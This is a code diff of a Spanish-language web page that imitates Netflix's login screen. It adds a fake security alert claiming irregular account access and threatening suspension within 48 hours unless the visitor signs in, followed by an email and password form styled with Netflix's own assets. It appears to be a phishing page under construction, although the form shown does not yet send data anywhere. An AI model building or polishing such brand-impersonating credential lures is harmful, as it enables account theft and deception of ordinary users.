@@ -1,245 +1,365 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - Iniciar sesión</title>
-    <style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Netflix - Alerta e Iniciar sesión</title>
+<link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet" />
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        padding: 20px;
+        font-family: 'Poppins', Arial, sans-serif;
+        /* Fondo con imagen + overlay negro oscuro */
+        background:
+            linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
+            url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
+        background-size: cover;
+        color: #e5e5e5;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* Contenedor general */
+    .container {
+        width: 100%;
+        max-width: 600px;
+        background-color: rgba(20, 20, 20, 0.85);
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.7);
+        padding: 40px 30px;
+        box-sizing: border-box;
+        color: #e5e5e5;
+    }
+
+    /* Ocultar contenedor por defecto */
+    .hidden {
+        display: none;
+    }
+
+    /* Estilos del primer bloque (alerta) */
+    .logo-container {
+        text-align: center;
+        margin-bottom: 35px;
+    }
+    .logo-container img {
+        width: 140px;
+        filter: none;
+    }
+    .title {
+        font-size: 28px;
+        font-weight: 700;
+        margin-bottom: 25px;
+        line-height: 1.2;
+        text-align: center;
+    }
+    .paragraph {
+        color: #cccccc;
+        font-size: 17px;
+        line-height: 1.6;
+        margin-top: 0;
+        margin-bottom: 0;
+        text-align: justify;
+    }
+    .paragraph + .paragraph {
+        margin-top: 8px;
+    }
+    .button-block {
+        text-align: center;
+        margin: 35px 0 25px;
+    }
+    .button-block a {
+        display: inline-block;
+        color: #ffffff;
+        background-color: #e50914;
+        border-radius: 30px;
+        padding: 16px 60px;
+        font-size: 18px;
+        font-weight: 600;
+        text-decoration: none;
+        box-shadow: 0 4px 12px rgba(229, 9, 20, 0.6);
+        transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        cursor: pointer;
+    }
+    .button-block a:hover {
+        background-color: #f6121d;
+        box-shadow: 0 6px 18px rgba(246, 18, 29, 0.8);
+    }
+
+    /* Estilos para login (segundo bloque) */
+    .login-container {
+        background-color: rgba(0, 0, 0, 0.75);
+        padding: 30px 25px;
+        border-radius: 4px;
+        max-width: 360px;
+        margin: 0 auto;
+        box-sizing: border-box;
+        color: #fff;
+        position: relative;
+    }
+    .login-title {
+        font-size: 1.6em;
+        font-weight: bold;
+        margin-bottom: 20px;
+    }
+    .form-group {
+        margin-bottom: 12px;
+    }
+    .form-group input {
+        width: 100%;
+        padding: 12px;
+        background-color: #333;
+        border: none;
+        color: #fff;
+        border-radius: 4px;
+        font-size: 15px;
+        box-sizing: border-box;
+    }
+    .form-group input::placeholder {
+        color: #8c8c8c;
+    }
+    .form-group input:focus {
+        outline: none;
+        border: 1px solid #fff;
+        background-color: #444;
+    }
+    .login-btn {
+        width: 100%;
+        padding: 12px;
+        background-color: #e50914;
+        border: none;
+        color: #fff;
+        font-size: 15px;
+        font-weight: bold;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 12px;
+    }
+    .login-btn:hover {
+        background-color: #f40612;
+    }
+    .options-divider {
+        text-align: center;
+        color: #737373;
+        margin: 14px 0;
+        font-size: 0.85em;
+    }
+    .login-code-btn {
+        display: block;
+        width: 100%;
+        padding: 12px;
+        background-color: transparent;
+        border: 1px solid #8c8c8c;
+        color: #fff;
+        font-size: 15px;
+        font-weight: bold;
+        border-radius: 4px;
+        cursor: pointer;
+        text-align: center;
+        text-decoration: none;
+        margin: 0;
+        box-sizing: border-box;
+    }
+    .login-code-btn:hover {
+        background-color: rgba(255, 255, 255, 0.05);
+    }
+    .remember-help-flex {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 14px;
+        font-size: 0.85em;
+    }
+    .remember-me {
+        display: flex;
+        align-items: center;
+        color: #b3b3b3;
+    }
+    .remember-me input {
+        margin-right: 5px;
+    }
+    .help-options a {
+        color: #b3b3b3;
+        text-decoration: none;
+    }
+    .help-options a:hover {
+        text-decoration: underline;
+    }
+    .signup-section {
+        margin-top: 30px;
+        color: #737373;
+        font-size: 0.9em;
+    }
+    .signup-section a {
+        color: #fff;
+        text-decoration: none;
+    }
+    .signup-section strong {
+        font-weight: bold;
+    }
+    .signup-section a:hover {
+        text-decoration: underline;
+    }
+    .recaptcha-section {
+        font-size: 0.75em;
+        color: #8c8c8c;
+        margin-top: 8px;
+        line-height: 1.4;
+    }
+    .recaptcha-section a {
+        color: #0071eb;
+        text-decoration: none;
+    }
+    .recaptcha-section a:hover {
+        text-decoration: underline;
+    }
+
+    /* Responsive móvil para todo */
+    @media (max-width: 480px) {
         body {
-            font-family: Arial, Helvetica, sans-serif;
-            background-color: #000;
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
+            padding: 10px;
+            background:
+                linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
+                url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
             background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            position: relative;
+            color: #e5e5e5;
+            min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
         }
-
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.6);
-            z-index: 1;
-        }
-
-        .logo-container {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            z-index: 2;
-        }
-        .netflix-logo {
-            width: 100px;
-        }
-
-        .login-container {
-            position: relative;
-            z-index: 2;
-            background-color: rgba(0, 0, 0, 0.75);
-            padding: 30px 25px;
-            border-radius: 4px;
-            width: 100%;
+        .container {
             max-width: 360px;
-            margin: 20px auto;
-            box-sizing: border-box;
+            padding: 20px 15px;
+            border-radius: 8px;
+            box-shadow: none;
+            overflow-y: auto;
         }
-
-        .login-title {
-            font-size: 1.6em;
-            font-weight: bold;
+        .logo-container {
             margin-bottom: 20px;
-            color: #fff;
         }
-
-        /* Inputs y botones alineados */
+        .logo-container img {
+            width: 120px;
+        }
+        .title {
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .paragraph {
+            font-size: 14px;
+            margin-top: 0;
+            margin-bottom: 0;
+            line-height: 1.4;
+        }
+        .paragraph + .paragraph {
+            margin-top: 6px;
+        }
+        .button-block {
+            margin: 20px 0 15px;
+        }
+        .button-block a {
+            padding: 12px 40px;
+            font-size: 15px;
+            box-shadow: none;
+            border-radius: 20px;
+        }
+        .login-title {
+            font-size: 1.8em;
+        }
         .form-group input,
         .login-btn,
         .login-code-btn {
-            width: 100%;
-            box-sizing: border-box;
-            display: block;
+            font-size: 16px;
         }
-
-        /* Inputs */
-        .form-group {
-            margin-bottom: 12px;
-        }
-        .form-group input {
-            padding: 12px;
-            background-color: #333;
-            border: none;
-            color: #fff;
-            border-radius: 4px;
-            font-size: 15px;
-        }
-        .form-group input::placeholder {
-            color: #8c8c8c;
-        }
-        .form-group input:focus {
-            outline: none;
-            border: 1px solid #fff;
-            background-color: #444;
-        }
-
-        /* Botón iniciar sesión */
-        .login-btn {
-            padding: 12px;
-            background-color: #e50914;
-            border: none;
-            color: #fff;
-            font-size: 15px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 12px;
-        }
-        .login-btn:hover {
-            background-color: #f40612;
-        }
-
-        /* Divisor */
-        .options-divider {
-            text-align: center;
-            color: #737373;
-            margin: 14px 0;
-            font-size: 0.85em;
-        }
-
-        /* Botón código inicio */
-        .login-code-btn {
-            padding: 12px;
-            background-color: transparent;
-            border: 1px solid #8c8c8c;
-            color: #fff;
-            font-size: 15px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            margin: 0;
-        }
-        .login-code-btn:hover {
-            background-color: rgba(255, 255, 255, 0.05);
-        }
-
-        /* Recordarme y ayuda */
-        .remember-help-flex {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 14px;
-            font-size: 0.85em;
-        }
-        .remember-me {
-            display: flex;
-            align-items: center;
-            color: #b3b3b3;
-        }
-        .remember-me input {
-            margin-right: 5px;
-        }
-        .help-options a {
-            color: #b3b3b3;
-            text-decoration: none;
-        }
-        .help-options a:hover {
-            text-decoration: underline;
-        }
-
-        /* Suscripción */
-        .signup-section {
-            margin-top: 30px;
-            color: #737373;
+        .remember-help-flex,
+        .signup-section,
+        .recaptcha-section {
             font-size: 0.9em;
         }
-        .signup-section a {
-            color: #fff;
-            text-decoration: none;
-        }
-        .signup-section strong {
-            font-weight: bold;
-        }
-        .signup-section a:hover {
-            text-decoration: underline;
-        }
-
-        /* ReCAPTCHA */
-        .recaptcha-section {
-            font-size: 0.75em;
-            color: #8c8c8c;
-            margin-top: 8px;
-            line-height: 1.4;
-        }
-        .recaptcha-section a {
-            color: #0071eb;
-            text-decoration: none;
-        }
-        .recaptcha-section a:hover {
-            text-decoration: underline;
-        }
-        
-        @media (max-width: 480px) {
-            body {
-                background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
-                align-items: flex-start;
-                padding-top: 80px;
-            }
-            .login-container {
-                margin: 0 10px;
-            }
-            .login-title {
-                font-size: 1.8em;
-            }
-            .form-group input, .login-btn, .login-code-btn {
-                font-size: 16px;
-            }
-            .remember-help-flex, .signup-section, .recaptcha-section {
-                font-size: 0.9em;
-            }
-        }
-    </style>
+    }
+</style>
 </head>
 <body>
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo">
-    </div>
-    
-    <div class="login-container">
-        <h1 class="login-title">Iniciar sesión</h1>
-        <form>
-            <div class="form-group">
-                <input type="text" placeholder="Email o número de celular">
-            </div>
-            <div class="form-group">
-                <input type="password" placeholder="Contraseña">
-            </div>
-            <button type="submit" class="login-btn">Iniciar sesión</button>
-            <div class="options-divider">O</div>
-            <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
-            <div class="remember-help-flex">
-                <div class="remember-me">
-                    <input type="checkbox" id="remember">
-                    <label for="remember">Recordarme</label>
-                </div>
-                <div class="help-options">
-                    <a href="#">¿Olvidaste la contraseña?</a>
-                </div>
-            </div>
-        </form>
-        <div class="signup-section">
-            <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
+
+<!-- Contenedor principal -->
+<div class="container">
+
+    <!-- Pantalla inicial (alerta) -->
+    <div id="alert-screen">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
         </div>
-        <div class="recaptcha-section">
-            <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
+
+        <div class="title">
+            Problemas detectados en tu cuenta Netflix
+        </div>
+
+        <div class="paragraph">
+            Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
+        </div>
+
+        <div class="paragraph">
+            Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
+        </div>
+
+        <div class="button-block">
+            <a href="#" id="go-to-login">Iniciar sesión</a> 
         </div>
     </div>
+
+    <!-- Pantalla login -->
+    <div id="login-screen" class="hidden">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
+        </div>
+
+        <div class="login-container">
+            <h1 class="login-title">Iniciar sesión</h1>
+            <form>
+                <div class="form-group">
+                    <input type="text" placeholder="Email o número de celular" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" placeholder="Contraseña" required>
+                </div>
+                <button type="submit" class="login-btn">Iniciar sesión</button>
+                <div class="options-divider">O</div>
+                <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
+                <div class="remember-help-flex">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Recordarme</label>
+                    </div>
+                    <div class="help-options">
+                        <a href="#">¿Olvidaste la contraseña?</a>
+                    </div>
+                </div>
+            </form>
+            <div class="signup-section">
+                <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
+            </div>
+            <div class="recaptcha-section">
+                <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Al hacer clic en "Iniciar sesión" del alert, ocultar alert y mostrar login
+    document.getElementById('go-to-login').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('alert-screen').classList.add('hidden');
+        document.getElementById('login-screen').classList.remove('hidden');
+    });
+</script>
+
 </body>
 </html>
